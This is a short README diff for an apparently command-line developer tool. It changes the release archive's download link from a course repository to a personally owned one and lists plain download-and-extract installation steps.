@@ -8,7 +8,7 @@ Developers living in a command-line environment who write programs and applicati
 
 
 **Installation instructions:**
-1)  Download the `unix_release.tar.xz` archive in the folder `installers` on the repo. Direct download link: https://github.com/CPEN-221-2025/project-sycamore/blob/main/installer/unix_release.tar.xz.
+1)  Download the `unix_release.tar.xz` archive in the folder `installers` on the repo. Direct download link: https://github.com/kaius508RHEL/spellingAplus/blob/main/installer/unix_release.tar.xz.
 2)  Extract the downloaded tar archive.
 3)  See the `README` file in the root of the archive. It outlines the system requirements including supported operating systems, currently MacOS and Linux with bash or zsh, and required software.
        NOTE: The `README.md` in the root of the repo is not the same as the `README` in the installation archive.
